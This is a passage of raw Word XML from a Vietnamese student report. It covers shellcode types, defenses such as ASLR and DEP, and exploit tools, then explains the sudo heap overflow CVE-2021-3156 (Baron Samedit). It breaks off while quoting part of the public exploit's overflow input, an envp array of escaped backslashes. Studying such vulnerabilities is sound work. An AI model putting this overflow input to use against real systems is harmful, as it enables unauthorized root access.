    <w:p w14:paraId="75B6DA40" w14:textId="3B82C0BD" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Remote Shellcode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DFCB54" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Được gửi từ xa qua mạng đến hệ thống mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E881594" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Thường kết hợp với các giao thức như HTTP, TCP, UDP để khai thác.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B0B439" w14:textId="0E5B76FD" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Bind Shellcode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06FEB6F1" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Mở một cổng trên máy nạn nhân, cho phép kẻ tấn công kết nối đến từ xa.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BCF2EB" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Yêu cầu máy nạn nhân không bị bảo vệ bởi firewall chặn cổng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC02A7E" w14:textId="17602F08" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Reverse Shellcode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2AE6D5" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Máy nạn nhân tự kết nối ngược về máy kẻ tấn công, thường qua một cổng do kẻ tấn công chỉ định.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE66906" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Dễ vượt qua firewall hơn so với bind shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3457D762" w14:textId="7F0C6438" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Staged và Stageless Shellcode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EE9A07" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Staged Shellcode: Tải từng phần mã nhỏ và sau đó tải thêm phần tiếp theo khi cần.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C1C014" w14:textId="549D15A9" w:rsidR="00EB2D20" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Stageless Shellcode: Toàn bộ mã được thực thi một lần.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E8C9BF" w14:textId="4C00D297" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc185277771"/>
      <w:r w:rsidRPr="006C635A">
        <w:t>Bảo mật và Phòng chống Shellcode</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="39B52CC6" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Các cơ chế bảo mật:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B01627" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>ASLR (Address Space Layout Randomization): Ngẫu nhiên hóa vị trí bộ nhớ, gây khó khăn cho shellcode.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C18171" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>DEP (Data Execution Prevention): Ngăn thực thi mã trong các vùng nhớ dữ liệu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD247FF" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Stack Canaries: Dùng giá trị kiểm tra (canary) để phát hiện thay đổi stack bất thường.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7499039E" w14:textId="656D35A6" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Control Flow Integrity (CFI): Xác minh luồng thực thi hợp lệ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2CCC3F" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Lỗi tràn bộ đệm đã được biết đến từ lâu và con số này tăng lên đáng kể theo thời gian. Năm 2017, 2018 theo thống kê từ cơ sở dữ liệu CVE tại NIST khiến nhiều người choáng ngợp vì so với từ 2010 đến 2016 chênh lệch quá nhiều.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA44C81" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Như vậy có thể thấy có nhiều code không an toàn và để bảo vệ hệ thống của mình khỏi các khai thác liên quan đến shellcode bạn cần bảo mật nhiều lớp. Bên cạnh lớp tường lửa mạnh mẽ, bền bỉ thì cần kiểm soát thiết bị để tránh những kết nối nguy hiểm.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F52568" w14:textId="29B0179E" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Đặc biệt để nắm bắt những hành động độc hại trước và sau thực thi bạn nên ứng dụng Al tĩnh. Machine Learning sẽ giúp phát hiện hành vi nguy hiểm và ngăn chặn mọi âm mưu để không gây ra thiệt hại nào.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112D6519" w14:textId="64C9A731" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc185277772"/>
      <w:r w:rsidRPr="006C635A">
        <w:t>Các công cụ phổ biến liên quan đến Shellcode</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="7A90D011" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRDefault="006C635A" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Tạo và sử dụng shellcode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7B3551" w14:textId="40B4FE69" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Metasploit Framework: Khai thác và tạo shellcode mạnh mẽ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B9526B" w14:textId="27D7090E" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Msfvenom: Tạo shellcode tùy chỉnh.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279BC597" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Debug và kiểm tra:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF7E8EE" w14:textId="0A5755C7" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Immunity Debugger, OllyDbg, GDB: Phân tích shellcode.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D919130" w14:textId="30273FAC" w:rsidR="0063397E" w:rsidRDefault="006C635A" w:rsidP="00752B4D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>IDA Pro: Công cụ dịch ngược mã.</w:t>
      </w:r>
      <w:r w:rsidR="00DD7BD0">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7ED17E" w14:textId="501B9998" w:rsidR="005202D3" w:rsidRDefault="0063397E" w:rsidP="00CE570D">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc185277773"/>
      <w:r w:rsidRPr="0063397E">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">NGHIÊN CỨU </w:t>
      </w:r>
      <w:r w:rsidR="00752B4D">
        <w:t>VỀ LỖ HỔNG</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="10ACE64F" w14:textId="630C7D90" w:rsidR="0036465C" w:rsidRDefault="00752B4D" w:rsidP="0036465C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc185277774"/>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>CVE-2021-3156 (Baron Samedit)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
    </w:p>
    <w:p w14:paraId="17421C36" w14:textId="2CF1BEFA" w:rsidR="0063397E" w:rsidRPr="0063397E" w:rsidRDefault="00752B4D" w:rsidP="0063397E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc185277775"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Mô tả</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="47C6DC42" w14:textId="5F29ECEF" w:rsidR="00752B4D" w:rsidRPr="00752B4D"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Sudo (Substitute User Do hoặc Super User Do) là một chương trình trên các hệ điều hành Unix/Linux. Chương trình này cho phép quản trị viên hệ thống cấp quyền truy cập đặc quyền (thường là root) cho người dùng thông thường mà vẫn duy trì nguyên tắc đặc quyền tối thiểu và đảm bảo an toàn cho toàn bộ hệ thống. Người dùng sử dụng sudo chỉ thực hiện được các nhiệm vụ cụ thể được cấp phép mà không ảnh hưởng đến các phần khác của hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FCA04D" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D"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ab/>
        <w:t>Khi sử dụng sudo, người dùng thông thường có thể thực thi các lệnh với quyền cao hơn nếu được cấu hình trong file sudoers. File này là nơi mà quản trị viên định nghĩa các quyền hạn cụ thể, chẳng hạn như người dùng nào được chạy lệnh nào và dưới quyền của tài khoản nào. Ngoài việc cấp quyền root, sudo cũng có thể được thiết lập để cho phép người dùng thực hiện các lệnh với tư cách một tài khoản khác mà không cần tiết lộ mật khẩu root. Điều này giúp bảo vệ tính bảo mật của tài khoản siêu người dùng quan trọng này.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209E7906" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D"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ab/>
        <w:t>Một trong những đặc điểm nổi bật của sudo là khả năng ghi nhật ký. Mỗi lệnh được thực thi thông qua sudo đều được ghi lại, bao gồm thông tin về lệnh, thời gian thực hiện và người thực hiện. Tính năng này không chỉ hỗ trợ quản trị viên theo dõi các hành động trên hệ thống mà còn cung cấp thông tin quan trọng để điều tra nếu có sự cố xảy ra.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A95A6DB" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D"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ab/>
        <w:t xml:space="preserve">Sudo hoạt động dựa trên nguyên tắc cấp quyền đủ để người dùng hoàn thành nhiệm vụ của họ. Ví dụ, thay vì cấp toàn quyền root, quản trị viên có thể cho pháp một người dùng chỉ khởi động lại dịch vụ hoặc xem nhật ký hệ thống. </w:t>
      </w:r>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Điều này không chỉ hạn chế quyền truy cập vào các phần không cần thiết mà còn giảm thiểu rủi ro tiềm tàng nếu tài khoản bị tấn công.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2F0AEE" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D"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ab/>
        <w:t>Tuy nhiên, sudo cũng có thể trở thành một mối nguy hiểm nếu không được quản lý cẩn thận. Cấu hình không đúng trong file sudoers có thể dẫn đến cấp quyền quá mức, tạo điều kiện cho người dùng lạm dụng quyền hạn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C3318A" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D"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ab/>
        <w:t>Vào tháng 2 năm 2021, các nhà nghiên cứu của Qualys đã công bố về lỗ hổng bảo mật nghiêm trọng trong Sudo, còn gọi là Baron Samedit hay được định danh là CVE-2021-3156.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234FCF94" w14:textId="150983EF" w:rsidR="0036465C" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:tab/>
        <w:t>Đây là một lỗi tràn bộ đệm trong bộ nhớ heap, có thể bị khai thác bởi người dùng cục bộ (bao gồm người dùng thông thường và người dùng hệ thống, được liệt kê trong danh sách sudoer hoặc không). Lỗ hổng này cho phép bất kỳ người dùng không có đặc quyền nào (unprivileged user) nâng cấp đặc quyền lên root và kiểm soát hoàn toàn hệ thống</w:t>
      </w:r>
      <w:r w:rsidR="0063397E" w:rsidRPr="0063397E">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACB5F4C" w14:textId="77777777" w:rsidR="00645FDE" w:rsidRDefault="00752B4D" w:rsidP="00645FDE">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="34532B2E" wp14:editId="25AD919C">
            <wp:extent cx="5758815" cy="3239333"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1256007628" name="Picture 1256007628" descr="Cảnh Báo Lỗ Hổng Bảo Mật CVE-2021-3156 Cho Phép Người Dùng Cục Bộ Chiếm Đặc  Quyền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nh Báo Lỗ Hổng Bảo Mật CVE-2021-3156 Cho Phép Người Dùng Cục Bộ Chiếm Đặc  Quyền Ro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3239333"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="744A7886" w14:textId="664119CC" w:rsidR="00752B4D" w:rsidRDefault="00645FDE" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc185277493"/>
      <w:r>
        <w:t xml:space="preserve">Hình 2. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_2. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00746169">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00645FDE">
        <w:t>CVE-2021-3156 (Baron Samedit)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w14:paraId="04064E67" w14:textId="0A871752" w:rsidR="0063397E" w:rsidRDefault="00752B4D" w:rsidP="0063397E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc185277776"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Nguyên nhân xảy ra</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="503E1305" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Lỗ hổng CVE-2021-3156 đã tồn tại gần một thập kỷ, xuất hiện từ tháng 7 năm 2011 thông qua commit 8255ed69. Nó ảnh hưởng đến các phiên bản cũ từ 1.8.2 đến 1.8.31p2 hay các phiên bản mới từ 1.9.0 đến 1.9.5p1 trong cấu hình mặc định.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786C8FF0" w14:textId="10E511FD" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Điểm đáng chú ý của lỗ hổng này là nó không yêu cầu quyền sudo trước đó và hoạt động ngay trên cấu hình mặc định. Điều này khiến nó trở nên nguy hiểm hơn vì bất kỳ người dùng thông thường nào trên hệ thống cũng có thể khai thác để đạt được quyền root.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DAE451" w14:textId="3EEFC212" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Nguyên nhân gốc rễ của lỗ hổng này nằm ở cơ chế phân tích cú pháp các chuỗi đầu vào của sudo. Khi nhận được các tham số từ dòng lệnh, sudo không kiểm tra cẩn thận cách xử lý các ký tự escape (\). Kẻ tấn công có thể lợi dụng lỗi này bằng cách gửi một chuỗi đầu vào được định dạng đặc biệt, khiến dữ liệu vượt quá kích thước của vùng nhớ được cấp phát trên heap. Vùng dữ liệu dư thừa này sẽ ghi đè lên các khu vực bộ nhớ liền kề, gây ra hiện tượng tràn bộ nhớ. Đây là một trong những lỗ hổng nghiêm trọng nhất vì nó có thể thay đổi luồng điều khiển của chương trình và cho phép thực thi mã độc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2375FAA1" w14:textId="0EF5037F" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Để hiểu rõ hơn, xét 1 đoạn mã trong mã khai thác:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001CA811" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">char* </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>envp[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666842C7" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        overflow,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D6CBBF" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7353457C" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        "XXXXXXX\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9DA3DA" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00752B4D">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A3BB23" w14:textId="77777777" w:rsidR="00752B4D" w:rsidRPr="00752B4D" w:rsidRDefault="00752B4D" w:rsidP="00752B4D">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
